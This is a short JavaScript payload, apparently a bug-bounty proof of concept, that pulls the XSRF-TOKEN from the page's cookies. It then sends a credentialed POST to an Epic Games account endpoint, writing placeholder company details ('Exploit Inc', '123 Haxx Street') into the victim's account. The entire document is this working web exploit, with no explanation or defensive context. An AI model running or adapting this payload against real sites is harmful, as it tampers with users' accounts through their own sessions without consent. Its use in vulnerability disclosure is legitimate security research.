const xsrf = document.cookie.match(/XSRF-TOKEN=([^;]+)/);
if (xsrf) {
  fetch("https://www.epicgames.com/account/v2/company-info/add", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/json",
      "X-XSRF-TOKEN": decodeURIComponent(xsrf[1])
    },
    body: JSON.stringify({
      companyName: "Exploit Inc",
      addressLine1: "123 Haxx Street",
      city: "BugBounty",
      postalCode: "31337",
      country: "US"
    })
  });
} else {
  console.log("XSRF-TOKEN not found in document.cookie");
}
